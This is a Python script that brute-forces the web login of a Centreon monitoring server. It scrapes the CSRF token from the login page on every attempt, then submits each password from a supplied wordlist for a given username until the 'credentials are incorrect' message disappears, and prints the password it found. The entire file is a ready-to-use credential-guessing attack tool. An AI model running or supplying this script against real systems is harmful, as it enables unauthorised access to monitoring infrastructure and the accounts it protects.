#!/usr/bin/python

import requests
import sys
import warnings
from bs4 import BeautifulSoup
from time import sleep

# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

url = sys.argv[1]
username = sys.argv[2]
passwordlist = sys.argv[3]

with open(passwordlist,"r") as f:
	for line in f:
		password = line.strip()
		print ("Trying with password: " + password)
		request = requests.session()
#		print("[+] Retrieving CSRF token to submit the login form")
		page = request.get(url+"/index.php")
		html_content = page.text
		soup = BeautifulSoup(html_content)
		token = soup.findAll('input')[3].get("value")
		
		login_info = {
		    "useralias": username,
		    "password": password,
		    "submitLogin": "Connect",
		    "centreon_token": token
		}
#		print login_info

		login_request = request.post(url+"/index.php", login_info)
#		print("[+] Login token is : {0}".format(token))
		if "Your credentials are incorrect." not in login_request.text:
		    print("[+] Logged In Sucssfully")
		    print("Password Found: " + password)
#		    print("[+] Retrieving Poller token")
		    exit()
		else:
#		    sleep(3)
		    request.close()
